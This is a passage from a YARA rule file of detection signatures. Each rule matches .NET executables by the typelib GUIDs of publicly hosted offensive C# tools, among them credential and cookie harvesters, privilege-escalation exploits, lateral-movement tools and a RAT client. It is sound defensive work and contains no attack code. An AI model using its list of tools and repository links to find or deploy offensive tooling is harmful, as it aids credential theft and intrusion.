\"4f495784-b443-4838-9fa6-9149293af785\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Watson {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/Watson\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"49ad5f38-9e37-4967-9e84-fe19c7434ed7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_StandIn {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/StandIn\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"01c142ba-7af1-48d6-b185-81147a2f7db7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_azure_password_harvesting {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/guardicore/azure_password_harvesting\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"7ad1ff2d-32ac-4c54-b615-9bb164160dac\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PowerOPS {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fdiskyou/PowerOPS\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"2a3c5921-7442-42c3-8cb9-24f21d0b2414\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Random_CSharpTools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/xorrior/Random-CSharpTools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"f7fc19da-67a3-437d-b3b0-2a257f77a00b\" ascii nocase wide\n        $typelibguid1 = \"47e85bb6-9138-4374-8092-0aeb301fe64b\" ascii nocase wide\n        $typelibguid2 = \"c7d854d8-4e3a-43a6-872f-e0710e5943f7\" ascii nocase wide\n        $typelibguid3 = \"d6685430-8d8d-4e2e-b202-de14efa25211\" ascii nocase wide\n        $typelibguid4 = \"1df925fc-9a89-4170-b763-1c735430b7d0\" ascii nocase wide\n        $typelibguid5 = \"817cc61b-8471-4c1e-b5d6-c754fc550a03\" ascii nocase wide\n        $typelibguid6 = \"60116613-c74e-41b9-b80e-35e02f25891e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2020_0668 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RedCursorSecurityConsulting/CVE-2020-0668\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"1b4c5ec1-2845-40fd-a173-62c450f12ea5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WindowsRpcClients {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/WindowsRpcClients\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"843d8862-42eb-49ee-94e6-bca798dd33ea\" ascii nocase wide\n        $typelibguid1 = \"632e4c3b-3013-46fc-bc6e-22828bf629e3\" ascii nocase wide\n        $typelibguid2 = \"a2091d2f-6f7e-4118-a203-4cea4bea6bfa\" ascii nocase wide\n        $typelibguid3 = \"950ef8ce-ec92-4e02-b122-0d41d83065b8\" ascii nocase wide\n        $typelibguid4 = \"d51301bc-31aa-4475-8944-882ecf80e10d\" ascii nocase wide\n        $typelibguid5 = \"823ff111-4de2-4637-af01-4bdc3ca4cf15\" ascii nocase wide\n        $typelibguid6 = \"5d28f15e-3bb8-4088-abe0-b517b31d4595\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpFruit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpFruit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"3da2f6de-75be-4c9d-8070-08da45e79761\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpWitness {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/SharpWitness\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b9f6ec34-4ccc-4247-bcef-c1daab9b4469\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RexCrypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/syrex1013/RexCrypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"10cd7c1c-e56d-4b1b-80dc-e4c496c5fec5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharPersist {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fireeye/SharPersist\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9d1b853e-58f1-4ba5-aefc-5c221ca30e48\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2019_1253 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/CVE-2019-1253\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"584964c1-f983-498d-8370-23e27fdd0399\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_scout {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jaredhaight/scout\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d9c76e82-b848-47d4-8f22-99bf22a8ee11\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Grouper2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/l0ss/Grouper2/\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"5decaea3-2610-4065-99dc-65b9b4ba6ccd\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CasperStager {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ustayready/CasperStager\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"c653a9f2-0939-43c8-9b93-fed5e2e4c7e6\" ascii nocase wide\n        $typelibguid1 = \"48dfc55e-6ae5-4a36-abef-14bc09d7510b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TellMeYourSecrets {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/TellMeYourSecrets\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9b448062-7219-4d82-9a0a-e784c4b3aa27\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpExcel4_DCOM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpExcel4-DCOM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"68b83ce5-bbd9-4ee3-b1cc-5e9223fab52b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShooter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/SharpShooter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"56598f1c-6d88-4994-a392-af337abe5777\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_NoMSBuild {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/NoMSBuild\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"034a7b9f-18df-45da-b870-0e1cef500215\" ascii nocase wide\n        $typelibguid1 = \"59b449d7-c1e8-4f47-80b8-7375178961db\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TeleShadow2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ParsingTeam/TeleShadow2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"42c5c356-39cf-4c07-96df-ebb0ccf78ca4\" ascii nocase wide\n        $typelibguid1 = \"0242b5b1-4d26-413e-8c8c-13b4ed30d510\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BadPotato {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BeichenDream/BadPotato\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0527a14f-1591-4d94-943e-d6d784a50549\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LethalHTA {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/codewhitesec/LethalHTA\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"784cde17-ff0f-4e43-911a-19119e89c43f\" ascii nocase wide\n        $typelibguid1 = \"7e2de2c0-61dc-43ab-a0ec-c27ee2172ea6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpStat {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Raikia/SharpStat\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ffc5c721-49c8-448d-8ff4-2e3a7b7cc383\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SneakyService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/SneakyService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"897819d5-58e0-46a0-8e1a-91ea6a269d84\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/anthemtotheego/SharpExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"7fbad126-e21c-4c4e-a9f0-613fcf585a71\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCOM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpCOM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"51960f7d-76fe-499f-afbd-acabd7ba50d1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Inception {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/two06/Inception\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"03d96b8c-efd1-44a9-8db2-0b74db5d247a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_sharpwmi {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/QAX-A-Team/sharpwmi\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"bb357d38-6dc1-4f20-a54c-d664bd20677e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2019_1064 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RythmStick/CVE-2019-1064\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ff97e98a-635e-4ea9-b2d0-1a13f6bdbc38\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Tokenvator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/Tokenvator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"4b2b3bd4-d28f-44cc-96b3-4a2f64213109\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WheresMyImplant {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/WheresMyImplant\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cca59e4e-ce4d-40fc-965f-34560330c7e6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Naga {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/byt3bl33d3r/Naga\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"99428732-4979-47b6-a323-0bb7d6d07c95\" ascii nocase wide\n        $typelibguid1 = \"a2c9488f-6067-4b17-8c6f-2d464e65c535\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpBox {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/P1CKLES/SharpBox\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"616c1afb-2944-42ed-9951-bf435cadb600\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_rundotnetdll32 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/rundotnetdll32\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"a766db28-94b6-4ed1-aef9-5200bbdd8ca7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AntiDebug {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/AntiDebug\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"997265c1-1342-4d44-aded-67964a32f859\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DInvisibleRegistry {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NVISO-BE/DInvisibleRegistry\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"31d576fb-9fb9-455e-ab02-c78981634c65\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TikiTorch {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/TikiTorch\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"806c6c72-4adc-43d9-b028-6872fa48d334\" ascii nocase wide\n        $typelibguid1 = \"2ef9d8f7-6b77-4b75-822b-6a53a922c30f\" ascii nocase wide\n        $typelibguid2 = \"8f5f3a95-f05c-4dce-8bc3-d0a0d4153db6\" ascii nocase wide\n        $typelibguid3 = \"1f707405-9708-4a34-a809-2c62b84d4f0a\" ascii nocase wide\n        $typelibguid4 = \"97421325-b6d8-49e5-adf0-e2126abc17ee\" ascii nocase wide\n        $typelibguid5 = \"06c247da-e2e1-47f3-bc3c-da0838a6df1f\" ascii nocase wide\n        $typelibguid6 = \"fc700ac6-5182-421f-8853-0ad18cdbeb39\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HiveJack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Viralmaniar/HiveJack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e12e62fe-bea3-4989-bf04-6f76028623e3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DecryptAutoLogon {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/securesean/DecryptAutoLogon\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"015a37fc-53d0-499b-bffe-ab88c5086040\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UnstoppableService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/UnstoppableService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0c117ee5-2a21-dead-beef-8cc7f0caaa86\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpWMI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpWMI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6dd22880-dac5-4b4d-9c91-8c35cc7b8180\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EWSToolkit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/EWSToolkit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ca536d67-53c9-43b5-8bc8-9a05fdc567ed\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SweetPotato {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/CCob/SweetPotato\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6aeb5004-6093-4c23-aeae-911d64cacc58\" ascii nocase wide\n        $typelibguid1 = \"1bf9c10f-6f89-4520-9d2e-aaf17d17ba5e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_memscan {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/memscan\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"79462f87-8418-4834-9356-8c11e44ce189\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpStay {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpStay\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2963c954-7b1e-47f5-b4fa-2fc1f0d56aea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpLocker {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Pickfordmatt/SharpLocker\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"a6f8500f-68bc-4efc-962a-6c6e68d893af\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SauronEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/vivami/SauronEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0f43043d-8957-4ade-a0f4-25c1122e8118\" ascii nocase wide\n        $typelibguid1 = \"086bf0ca-f1e4-4e8f-9040-a8c37a49fa26\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_sitrep {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/sitrep\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"12963497-988f-46c0-9212-28b4b2b1831b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpClipboard {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/SharpClipboard\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"97484211-4726-4129-86aa-ae01d17690be\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCookieMonster {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/m0rv4i/SharpCookieMonster\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"566c5556-1204-4db9-9dc8-a24091baaa8e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_p0wnedShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Cn33liz/p0wnedShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2e9b1462-f47c-48ca-9d85-004493892381\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpMove {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpMove\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"8bf82bbe-909c-4777-a2fc-ea7c070ff43e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_C_Sharp_R_A_T_Client {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/AdvancedHacker101/C-Sharp-R.A.T-Client\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6d9e8852-e86c-4e36-9cb4-b3c3853ed6b8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpPrinter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpPrinter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"41b2d1e5-4c5d-444c-aa47-629955401ed9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EvilFOCA {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ElevenPaths/EvilFOCA\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"f26bdb4a-5846-4bec-8f52-3c39d32df495\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PoshC2_Misc {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nettitude/PoshC2_Misc\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"85773eb7-b159-45fe-96cd-11bad51da6de\" ascii nocase wide\n        $typelibguid1 = \"9d32ad59-4093-420d-b45c-5fff391e990d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharpire {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/Sharpire\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"39b75120-07fe-4833-a02e-579ff8b68331\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharp_SMBExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Sharp-SMBExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"344ee55a-4e32-46f2-a003-69ad52b55945\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MiscTools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/MiscTools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"384e9647-28a9-4835-8fa7-2472b1acedc0\" ascii nocase wide\n        $typelibguid1 = \"d7ec0ef5-157c-4533-bbcd-0fe070fbf8d9\" ascii nocase wide\n        $typelibguid2 = 